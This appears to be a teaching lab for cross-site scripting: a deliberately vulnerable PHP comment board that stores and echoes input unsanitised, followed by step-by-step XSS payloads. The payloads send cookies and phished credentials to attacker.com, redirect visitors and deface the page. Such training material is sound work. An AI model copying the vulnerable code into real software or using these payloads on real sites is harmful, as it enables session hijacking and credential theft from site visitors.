<?php
$comments_file = '../includes/comments.txt';

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $comment = $_POST['comment'];
    file_put_contents($comments_file, $comment . "\n", FILE_APPEND);
    // Redirect to the same page to prevent resubmission
    header("Location: " . $_SERVER['PHP_SELF']);
    exit();
}

$comments = file($comments_file, FILE_IGNORE_NEW_LINES);

foreach ($comments as $comment) {
    echo "Comment: " . $comment . "<br>";
}
?>
<form method="post">
    Comment: <textarea name="comment"></textarea><br>
    <input type="submit" value="Submit">
</form>

<h3>CROSS-SITE SCRIPTING (XSS)</h3>
<p>Check if we can execute a script with the following payload:</p>
<ol>
    <li>Input <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> as a comment and submit the form.</li>
</ol>
<p>
    This happens because the programmer displays the comment directly without sanitizing it:
    <pre>
    $comment = $_POST['comment'];
    echo "Comment: " . $comment;
    </pre>
</p>

<h3>STEALING COOKIES WITH XSS</h3>
<p>Try submitting the following payload to steal cookies:</p>
<ol>
    <li>Create a non-HttpOnly cookie (inspect->application->storage->cookies) <code>document.cookie = "testCookie=testValue; path=/";</code></li>
    <li>Input <code>&lt;script&gt;document.write('Cookies: ' + document.cookie)&lt;/script&gt;</code> as a comment and submit the form.</li>
</ol>
<p>
    This happens because the programmer displays the comment directly without sanitizing it. The injected script will execute in the context of the page and can access cookies and other sensitive data.
</p>

<h3>MORE DANGEROUS XSS - SENDING COOKIES TO ATTACKER</h3>
<p>Try submitting the following payload to send cookies to an attacker's server:</p>
<ol>
    <li>Input <code>&lt;script&gt;new Image().src='http://attacker.com/steal_cookies.php?cookies=' + document.cookie;&lt;/script&gt;</code> as a comment and submit the form.</li>
</ol>
<p>
    This happens because the programmer displays the comment directly without sanitizing it. The injected script will send the cookies to the attacker's server.
</p>

<h3>EXAMPLE OF MALICIOUS PAYLOADS</h3>
<p>Other examples of malicious payloads:</p>
<ul>
    <li>Changing the content of the page:
        <pre>&lt;script&gt;document.body.innerHTML='Hacked!';&lt;/script&gt;</pre>
    </li>
    <li>Redirecting the user to a malicious site:
        <pre>&lt;script&gt;window.location='http://malicious-site.com';&lt;/script&gt;</pre>
    </li>
    <li>Creating a fake login form to steal credentials:
        <pre>&lt;script&gt;
        document.body.innerHTML='&lt;form method="post" action="http://attacker.com/steal_credentials.php"&gt;Username: &lt;input type="text" name="username"&gt;&lt;br&gt;Password: &lt;input type="password" name="password"&gt;&lt;br&gt;&lt;input type="submit" value="Login"&gt;&lt;/form&gt;';
        &lt;/script&gt;</pre>
    </li>
</ul>
<p>These examples show how XSS can be used to perform various malicious actions, highlighting the importance of properly sanitizing user inputs.</p>

<h3>STORED CROSS-SITE SCRIPTING (XSS)</h3>
<p>Submit a comment containing a script to demonstrate a stored XSS attack:</p>
<ol>
    <li>Input <code>&lt;script&gt;alert('Stored XSS')&lt;/script&gt;</code> as a comment and submit the form.</li>
    <li>Observe that the script is stored and executed every time the page is loaded.</li>
</ol>
<p>
    This happens because the programmer stores and displays the comment directly without sanitizing it.
</p>

<h3>STORED XSS - STEALING COOKIES</h3>
<p>Submit a comment containing a script to steal cookies with a stored XSS attack:</p>
<ol>
    <li>Input <code>&lt;script&gt;new Image().src='http://attacker.com/steal_cookies.php?cookies=' + document.cookie;&lt;/script&gt;</code> as a comment and submit the form.</li>
    <li>Observe that the script is stored and sends the cookies to the attacker's server every time the page is loaded.</li>
</ol>
<p>
    This happens because the programmer stores and displays the comment directly without sanitizing it. The injected script will send the cookies to the attacker's server every time the page is accessed.
</p>

<h3>STORED XSS - REPLACING LOGIN FORM WITH A FAKE VERSION</h3>
<p>Submit a comment containing a script to replace the login form with a fake version:</p>
<ol>
    <li>Input the following payload as a comment and submit the form:
        <code>&lt;script&gt;
        document.body.innerHTML='&lt;form method="post" action="http://attacker.com/steal_credentials.php"&gt;Username: &lt;input type="text" name="username"&gt;&lt;br&gt;Password: &lt;input type="password" name="password"&gt;&lt;br&gt;&lt;input type="submit" value="Login"&gt;&lt;/form&gt;';
        &lt;/script&gt;</code>
    </li>
    <li>Observe that the script is stored and replaces the login form with a fake version every time the page is loaded.</li>
</ol>
<p>
    This happens because the programmer stores and displays the comment directly without sanitizing it. The injected script will replace the login form with a fake version every time the page is accessed, allowing the attacker to steal credentials.
</p>

<h3>STORED XSS - DEFACE WEBPAGE</h3>
<p>Submit a comment containing a script to deface the webpage:</p>
<ol>
    <li>Input the following payload as a comment and submit the form:
        <code>&lt;script&gt;
        document.body.innerHTML = '&lt;div style="position: fixed; width: 100%; height: 100%; background: black; top: 50%; left: 50%; transform: translate(-50%, -50%); font-size: 2em; color: red;"&gt;Defaced by Attacker&lt;/div&gt;';
        &lt;/script&gt;</code>
    </li>
    <li>Observe that the script is stored and executed every time the page is loaded, hiding all original content and displaying the defaced message.</li>
</ol>
<p>
    This happens because the programmer stores and displays the comment directly without sanitizing it. The injected script will replace the entire content of the page with the defaced message.
</p>
